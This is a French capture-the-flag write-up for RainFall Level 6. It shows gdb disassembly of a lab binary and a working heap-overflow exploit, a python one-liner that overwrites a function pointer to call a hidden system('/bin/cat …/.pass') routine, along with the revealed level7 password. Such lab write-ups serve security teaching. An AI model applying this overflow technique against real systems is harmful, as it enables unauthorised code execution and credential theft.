# Level 6

En décompilant le main du binaire, nous voyons qu'il fait appel à deux malloc à la suite un premier de `64` octets et un deuxième de `4` octets.

Le premier malloc sera utilisé pour copié `argv[1]` et le deuxième contiendra l'addresse de la fonction `m` ce qui sera donc un pointeur sur fonction puis appellé après le `strcpy`.

On peux aussi s'appercevoir qu'il existe une seconde fonction non utilisé dans le main, la fonction `n`. Cette dernière utilise `system` pour `cat` le pass du level7.

On peut alors réecrire le pointeur sur fonction avec l'adresse de la fonction `n` en copiant `64` octets + `8` de métadata du malloc pour copié ensuite l'adresse de `n` dans le pointeur sur fonction.

```shell
level6@RainFall:~$ gdb level6
(gdb) disas main
Dump of assembler code for function main:
[...]
   0x08048485 <+9>:	movl   $0x40,(%esp)
   0x0804848c <+16>:	call   0x8048350 <malloc@plt>
   0x08048491 <+21>:	mov    %eax,0x1c(%esp)
   0x08048495 <+25>:	movl   $0x4,(%esp)
   0x0804849c <+32>:	call   0x8048350 <malloc@plt>
   0x080484a1 <+37>:	mov    %eax,0x18(%esp)
   0x080484a5 <+41>:	mov    $0x8048468,%edx
[...]
   0x080484c5 <+73>:	call   0x8048340 <strcpy@plt>
   0x080484ca <+78>:	mov    0x18(%esp),%eax
   0x080484ce <+82>:	mov    (%eax),%eax
   0x080484d0 <+84>:	call   *%eax
[...]
End of assembler dump.
(gdb) info func
All defined functions:
Non-debugging symbols:
[...]
0x08048454  n
0x08048468  m
0x0804847c  main
[...]
(gdb) disas m
Dump of assembler code for function m:
[...]
   0x0804846e <+6>:	movl   $0x80485d1,(%esp)
   0x08048475 <+13>:	call   0x8048360 <puts@plt>
[...]
End of assembler dump.
(gdb) disas n
Dump of assembler code for function n:
[...]
   0x0804845a <+6>:	movl   $0x80485b0,(%esp)
   0x08048461 <+13>:	call   0x8048370 <system@plt>
[...]
End of assembler dump.
(gdb) x/s 0x80485b0
0x80485b0:	 "/bin/cat /home/user/level7/.pass"
(gdb) quit
~ ./level6 $(python -c 'print "B"*72 + "\x54\x84\x04\x08"')
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
```



